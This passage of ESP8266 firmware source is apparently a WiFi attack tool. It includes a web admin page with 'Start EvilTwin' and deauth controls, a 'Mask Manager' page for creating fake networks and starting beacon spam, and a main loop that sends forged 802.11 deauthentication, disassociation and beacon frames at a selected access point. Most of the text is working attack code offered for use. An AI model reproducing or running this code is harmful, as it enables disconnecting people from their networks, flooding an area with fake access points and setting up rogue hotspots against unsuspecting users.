    html.replace("{deauth_action}", "start");
  }
  html.replace("{deauth_disabled}", disabled ? "disabled" : "");

  if (hotspot_active) {
    html.replace("{hotspot_button}", "Stop EvilTwin");
    html.replace("{hotspot_action}", "stop");
  } else {
    html.replace("{hotspot_button}", "Start EvilTwin");
    html.replace("{hotspot_action}", "start");
  }
  html.replace("{hotspot_disabled}", disabled ? "disabled" : "");

  webServer.send(200, "text/html; charset=UTF-8", html);
  Serial.println("Admin page sent successfully.");
}

// ---------- Restart handler ----------
void handleRestart() {
  Serial.println("Restart requested. Rebooting ESP...");
  webServer.send(200, "text/plain", "Restarting...");
  delay(100);
  ESP.restart();
}

// ---------- Mask Manager ----------
String _maskHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mask Manager</title>
<style>
:root{
  --bg:#0a0f18;
  --panel:#111827;
  --border:#253044;
  --text:#f5f7fb;
  --muted:#8f9bb0;
  --accent:#5b8cff;
  --good:#35d39a;
}
*{box-sizing:border-box}
body{
  margin:0;
  background:var(--bg);
  color:var(--text);
  font-family:Inter,system-ui,sans-serif;
}
.shell{max-width:900px;margin:auto;padding:28px 18px 40px}
.topbar{
  display:flex;align-items:center;justify-content:space-between;gap:18px;
  padding:18px 20px;margin-bottom:22px;
  background:rgba(17,24,39,.82);border:1px solid var(--border);
  border-radius:18px;
}
.brand{display:flex;align-items:center;gap:13px}
.logo{
  width:44px;height:44px;border-radius:13px;
  display:grid;place-items:center;
  background:linear-gradient(135deg,var(--accent),#7c5cff);
  font-weight:800;font-size:18px;
}
.title{font-size:18px;font-weight:750}
.subtitle{font-size:12px;color:var(--muted)}
.actions{display:flex;gap:9px;flex-wrap:wrap;margin:12px 0}
button{
  border:1px solid var(--border);background:#151e2d;color:var(--text);
  padding:9px 13px;border-radius:10px;cursor:pointer;font-weight:650;
}
button:hover{border-color:#3b4a65;background:#192438}
.primary{background:var(--accent);border-color:var(--accent)}
.primary:hover{background:#4e7ff0}
.danger{background:#e74c3c;border-color:#e74c3c}
.danger:hover{background:#c0392b}
.success{background:#27ae60;border-color:#27ae60}
.success:hover{background:#2ecc71}
.table-wrap{
  overflow-x:auto;border:1px solid var(--border);border-radius:17px;
  background:rgba(17,24,39,.82);
}
table{width:100%;border-collapse:collapse;min-width:500px}
th,td{text-align:left;padding:15px 16px;border-bottom:1px solid var(--border)}
th{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:700}
td{font-size:13px}
tr:last-child td{border-bottom:0}
.trash{background:transparent;border:none;color:#e74c3c;cursor:pointer;font-size:18px;padding:4px 8px}
.trash:hover{color:#ff6b6b}
.empty{text-align:center;color:var(--muted);padding:30px 0}
.back-link{display:inline-block;margin-bottom:12px;color:var(--accent);text-decoration:none}
.back-link:hover{text-decoration:underline}
.input-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:8px 0}
.input-row input{background:#0f1724;border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:8px;flex:1;min-width:120px}
.input-row input:focus{outline:1px solid var(--accent)}
.footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
.watermark{text-align:center;margin-top:22px;font-size:13px;color:var(--muted);opacity:0.8;letter-spacing:0.5px}
.watermark span{color:var(--accent);font-weight:700}
@media(max-width:700px){
  .actions{flex-direction:column}
  .input-row{flex-direction:column}
  .input-row input{width:100%}
}
</style>
</head>
<body>
<div class="shell">
  <a href="/admin" class="back-link">← Back to Admin</a>
  <div class="topbar">
    <div class="brand">
      <div class="logo">M</div>
      <div>
        <div class="title">Mask Manager</div>
        <div class="subtitle">Create fake WiFi networks</div>
      </div>
    </div>
    <div>
      <span style="color:var(--muted);font-size:13px">Total: {count}</span>
    </div>
  </div>

  <div class="actions">
    <div class="input-row">
      <input type="text" id="customSsid" placeholder="SSID" style="flex:2">
      <button onclick="addCustom()" class="primary">Add Custom</button>
    </div>
    <div class="input-row">
      <input type="number" id="randomCount" value="5" min="1" max="10" style="width:80px">
      <button onclick="addRandom()" class="primary">Generate Random</button>
      <button onclick="clearAll()" class="danger">Delete All</button>
    </div>
    <div class="input-row">
      <button onclick="startSpam()" class="success" id="startBtn">▶ Start Spamming</button>
      <button onclick="stopSpam()" class="danger" id="stopBtn">⏹ Stop Spamming</button>
    </div>
    <div class="spam-status" id="spamStatus">Status: {spam_status}</div>
  </div>

  <div class="table-wrap">
    <table>
      <thead><tr><th>#</th><th>SSID</th><th>Action</th></tr></thead>
      <tbody id="maskTable">
        {rows}
      </tbody>
    </table>
  </div>
  <div class="footer">All masks are stored in memory only</div>
  <div class="watermark"><span>RNR Team</span> © 2026 • All rights reserved</div>
</div>
<script>
function addCustom() {
  const ssid = document.getElementById('customSsid').value.trim();
  if (!ssid) { alert('Please enter an SSID'); return; }
  fetch('/masks/add?ssid=' + encodeURIComponent(ssid), {method:'POST'})
    .then(() => location.reload());
}

function addRandom() {
  const count = document.getElementById('randomCount').value || 5;
  fetch('/masks/random?count=' + count, {method:'POST'})
    .then(() => location.reload());
}

function deleteMask(index) {
  if (confirm('Delete this mask?')) {
    fetch('/masks/delete?index=' + index, {method:'POST'})
      .then(() => location.reload());
  }
}

function clearAll() {
  if (confirm('Delete ALL masks?')) {
    fetch('/masks/clear', {method:'POST'})
      .then(() => location.reload());
  }
}

function startSpam() {
  fetch('/masks/start', {method:'POST'})
    .then(() => location.reload());
}

function stopSpam() {
  fetch('/masks/stop', {method:'POST'})
    .then(() => location.reload());
}
</script>
</body>
</html>
)rawliteral";

// ---------- Mask handlers ----------
void handleMasks() {
  String html = String(_maskHTML);
  String rows = "";
  if (maskCount == 0) {
    rows = "<tr><td colspan='3' class='empty'>No masks created yet</td></tr>";
  } else {
    for (int i = 0; i < maskCount; i++) {
      rows += "<tr>";
      rows += "<td>" + String(i+1) + "</td>";
      rows += "<td>" + htmlEscape(masks[i].ssid) + "</td>";
      rows += "<td><button class='trash' onclick='deleteMask(" + String(i) + ")'>&#128465;</button></td>";
      rows += "</tr>";
    }
  }
  html.replace("{rows}", rows);
  html.replace("{count}", String(maskCount));
  html.replace("{spam_status}", beacon_spamming_active ? "🟢 Spamming" : "🔴 Stopped");
  webServer.send(200, "text/html; charset=UTF-8", html);
}

void handleMasksAdd() {
  if (webServer.hasArg("ssid")) {
    String ssid = webServer.arg("ssid");
    if (ssid.length() > 0) {
      addMask(ssid);
    }
  }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksRandom() {
  int count = 5;
  if (webServer.hasArg("count")) {
    count = webServer.arg("count").toInt();
    if (count < 1) count = 1;
    if (count > 10) count = 10;
  }
  for (int i = 0; i < count; i++) {
    if (maskCount >= MAX_MASKS) break;
    addMask(randomSSID());
  }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksDelete() {
  if (webServer.hasArg("index")) {
    int idx = webServer.arg("index").toInt();
    deleteMask(idx);
  }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksClear() {
  clearMasks();
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksStart() {
  if (maskCount > 0) {
    beacon_spamming_active = true;
  }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksStop() {
  beacon_spamming_active = false;
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

// ---------- Utility ----------
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

// ---------- Loop ----------
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauth
  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }

  // Beacon Spamming
  if (beacon_spamming_active && maskCount > 0) {
    uint32_t currentTime = millis();

    if (currentTime - attackTime > 100) {
      attackTime = currentTime;
      nextChannel();

      for (int m = 0; m < maskCount; m++) {
        uint8_t* mac = masks[m].bssid;
        memcpy(&beaconPacket[10], mac, 6);
        memcpy(&beaconPacket[16], mac, 6);

        memcpy(&beaconPacket[38], emptySSID, 32);
        int ssidLen = masks[m].ssid.length();
        if (ssidLen > 32) ssidLen = 32;
        for (int i = 0; i < ssidLen; i++) {
          beaconPacket[38 + i] = masks[m].ssid.charAt(i);
        }

        beaconPacket[82] = wifi_channel;

        for (int k = 0; k < 3; k++) {
          if (appendSpaces) {
            wifi_send_pkt_freedom(beaconPacket, packetSize, 0);
          } else {
            uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
            uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
            memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);
            tmpPacket[37] = ssidLen;
            memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);
            wifi_send_pkt_freedom(tmpPacket, tmpPacketSize, 0);
            delete tmpPacket;
          }
          delay(1);
        }
      }
    }

    if (currentTime - packetRateTime > 1000) {
      packetRateTime = currentTime;
      Serial.print("Beacon packets/s: ");
      Serial.println(packetCounter);
      packetCounter = 0;
    }
  }

  // Scan every 15s
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    wifinow = millis();
  }
}
